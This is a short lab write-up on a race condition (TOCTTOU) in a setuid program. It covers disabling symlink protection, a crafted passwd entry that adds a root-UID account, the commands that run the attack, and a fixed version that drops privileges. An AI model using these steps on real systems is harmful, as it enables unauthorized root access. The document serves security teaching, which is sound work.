# LAB7 - Race Condition Vulnerability

## Environment
- Ubuntu 16.04 LTS server

## Turning Off Countermeasures
```
$ sudo sysctl -w fs.protected_symlinks=0  // Sticky Symlink Protection Inactivate
```

### Target
```
echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" > passwd_input
```

### Task2
```
$ gcc -o race_condition race_condition.c
$ sudo chown root race_condition
$ sudo chmod 4755 race_condition

$ gcc -o attack attack.c
$ chmod 755 check.sh
$ ./attack & ./check.sh
```
The attack program links passwd_input and /etc/pzsswd to /tmp/XYZ for infinite loop, and the check.sh runs the vulnerable race_condition program giving passwd_input as an argument while /etc/passwd hasn’t updated. After few seconds, the attacker program attacks the vulnerable program and then wins the race condition, TOCTTOU window.

### Task3
```
$ gcc -o race_condition_fixed race_condition_fixed.c
$ sudo chown root race_condition_fixed
$ sudo chmod 4755 race_condition_fixed

$ gcc -o attack attack.c
$ chmod 755 check.sh
$ ./attack & ./check.sh
```
As following the task2 process, I failed to attack the vulnerable program. That’s because the race_condition_fixed program makes EUID equals with RUID in order to disable the root privilege.